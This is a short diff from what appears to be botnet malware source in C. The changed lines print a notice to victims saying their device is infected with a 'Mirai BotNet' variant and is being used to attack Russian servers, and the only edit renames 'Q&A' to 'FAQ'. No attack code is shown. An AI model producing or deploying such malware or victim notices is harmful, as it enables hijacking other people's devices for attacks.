@@ -63,7 +63,7 @@ int main(int argc, char **args)
     fprintf(fp, "continue to attack Russian servers. You too need to take some action to ");
     fprintf(fp, "stop this war. If you want to get back to a normal life, send out messages ");
     fprintf(fp, "against the war on social networking sites. Much easier than being held for ransom, isn't it?\n\n\n");
-    fprintf(fp, "Q&A\n");
+    fprintf(fp, "FAQ\n");
     fprintf(fp, "Q: Is this device infected with \"Mirai BotNet to Tashiro\" (ja: 未来砲)?\n");
     fprintf(fp, "A:Yes. It is infected. However, please be assured that no personal information will be extracted.\n");
     fprintf(fp, "Q:255, I am committing a crime, right?\n");
